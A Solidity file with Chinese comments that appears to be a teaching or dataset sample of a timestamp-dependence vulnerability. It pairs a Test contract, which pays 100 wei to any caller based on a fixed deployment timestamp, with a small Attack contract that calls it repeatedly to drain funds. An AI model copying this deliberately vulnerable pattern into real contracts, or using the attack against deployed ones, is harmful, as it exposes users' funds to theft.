// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// 漏洞範例程式碼
// 漏洞描述：
// 此合約在部署時即利用 block.timestamp 記錄當前區塊的時間，並存在 state variable 'time' 中。
// 攻擊者（或礦工）可以透過控制部署時區塊的 timestamp（例如選擇在 timestamp % 2 == 1 的區塊中部署），
// 使得之後呼叫 pay() 時條件永遠滿足，進而能夠重複呼叫取得 100 wei。此機制依賴區塊鏈的控制資訊（timestamp等），
// 其中礦工可以有部份控制權，透過操弄區塊時間進行攻擊。

contract Test {
    // 漏洞：在部署時記錄 block.timestamp，之後不會更新，可能導致不預期行為
    uint time = block.timestamp; // 部署時的 timestamp

    // pay 函式：若 time % 2 == 1 則回傳 100 wei 給呼叫者
    function pay() public {
        // 漏洞重點：依賴固定不變的 block.timestamp 的餘數判斷行為
        if(time % 2 == 1) {
            // 修正：必須轉型為 payable address，才能使用 send() 方法
            payable(msg.sender).send(100);
        }
    }
}

// 攻擊合約範例：
// 攻擊者在部署 Test 合約時，若能影響部署區塊的 timestamp 使得 time % 2 == 1，
// 那麼日後任何人呼叫 pay() 都會因為固定的 time 值滿足條件，攻擊者亦可透過重複呼叫觸發此漏洞。

contract Attack {
    Test public target;

    // 部署攻擊合約時需傳入 Test 合約位址
    constructor(address _target) {
        target = Test(_target);
    }

    // attack 函式呼叫目標合約的 pay() 函式
    function attack() public {
        target.pay();
    }

    // 攻擊者可藉由自動化工具，在已知部署時條件滿足的環境下反覆呼叫 attack() 來牽制合約中的資金
}
